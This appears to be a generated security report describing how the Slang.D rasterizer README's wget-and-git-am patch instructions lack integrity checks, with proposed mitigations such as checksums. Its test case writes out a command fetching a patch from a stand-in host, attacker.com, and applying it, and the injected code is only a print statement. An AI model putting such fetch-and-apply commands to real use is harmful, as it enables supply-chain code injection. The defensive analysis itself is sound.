- Vulnerability Name: Malicious Patch Injection
- Description:
    - The project README provides instructions on how to integrate the Slang.D rasterizer with existing 3D Gaussian Splatting implementations (Inria and gsplat) by downloading and applying patch files.
    - Users are instructed to use `wget` to download patch files directly from the repository via raw GitHub URLs.
    - An attacker could replace the legitimate patch files hosted in the repository with malicious patch files.
    - If a user follows the instructions and downloads and applies a malicious patch, the `git am` command will apply the patch, injecting potentially malicious code into the user's local 3DGS codebase.
    - This injected code could be executed when the user runs their 3DGS training or rendering scripts.
- Impact:
    - Code injection into the user's 3D Gaussian Splatting implementation.
    - Arbitrary code execution on the user's machine when they run the patched 3DGS software.
    - Potential for data theft, system compromise, or other malicious activities depending on the attacker's payload within the malicious patch.
- Vulnerability Rank: High
- Currently Implemented Mitigations:
    - None. The project does not implement any mechanism to verify the integrity or authenticity of the patch files. It relies on users implicitly trusting the provided URLs and the GitHub platform.
- Missing Mitigations:
    - Patch Integrity Verification: Implement a mechanism to ensure the integrity of the patch files. This could involve:
        - Providing checksums (e.g., SHA256 hashes) of the patch files in the README, allowing users to manually verify the downloaded patches before applying them.
        - Digitally signing the patch files, although this might be more complex to implement and manage in this context.
    - User Warning: Add a clear warning in the README.md file advising users about the security risks of applying patches from any source without proper verification. Recommend users to verify the integrity of downloaded patches before applying them.
- Preconditions:
    - The user must follow the integration instructions provided in the README.md file.
    - The attacker must be able to replace the legitimate patch file on the repository (or convince users to download a malicious patch from a different source).
- Source Code Analysis:
    - **/code/README.md**:
        - The "Using it with popular 3DGS optimization libraries" section provides instructions to download patch files using `wget` from raw GitHub URLs:
            ```bash
            wget https://github.com/grgkopanas/slang-gaussian-rasterization/raw/main/slang_gaussian_rasterization/api/patches/3dgs_inria.patch
            git am 3dgs_inria.patch
            ```
        - This method of downloading and applying patches is inherently vulnerable if the patch source is compromised, as `git am` will apply any patch provided without verification.
    - There are no other files in the project that directly mitigate this vulnerability. The vulnerability stems from the integration instructions in the README and the lack of patch integrity checks.
- Security Test Case:
    1. **Attacker creates a malicious patch:**
        - Create a file named `malicious_patch.patch` with the following content. This patch is designed to add a print statement to the `train.py` file of the Inria 3DGS repository as a proof of concept for code injection.
        ```patch
        --- a/train.py
        +++ b/train.py
        @@ -1,2 +1,4 @@
         # malicous patch injected
+        print("Malicious patch has been injected and executed!")
         import os, sys, glob, argparse
         import numpy as np
        ```
    2. **Attacker hosts the malicious patch:**
        -  For testing purposes, the attacker can host this `malicious_patch.patch` file on a local web server or a publicly accessible file hosting service.  Assume the malicious patch is accessible at `http://attacker.com/malicious_patch.patch`.
    3. **Victim modifies README instructions (simulated attack):**
        -  The victim, intending to follow the integration instructions, is tricked into using a modified instruction.  Assume the victim replaces the legitimate `wget` command in the README instructions with the following command, pointing to the attacker's malicious patch:
            ```bash
            wget http://attacker.com/malicious_patch.patch -O 3dgs_inria.patch
            git am 3dgs_inria.patch
            ```
    4. **Victim executes modified instructions:**
        - The victim executes the modified commands in their terminal within the Inria 3DGS repository directory, as instructed in the (modified) README.
    5. **Verify code injection:**
        - The victim checks the `train.py` file in their Inria 3DGS repository. They will find the line `print("Malicious patch has been injected and executed!")` added at the beginning of the file, confirming the successful code injection.
    6. **Victim runs the patched code:**
        - The victim executes the `train.py` script as normally instructed by the Inria 3DGS repository documentation.
        - When `train.py` is executed, the message "Malicious patch has been injected and executed!" will be printed to the console *before* the normal execution of the `train.py` script, demonstrating that the injected code is indeed executed.

This test case demonstrates how a malicious patch can be injected and executed by a user following modified integration instructions, highlighting the vulnerability.
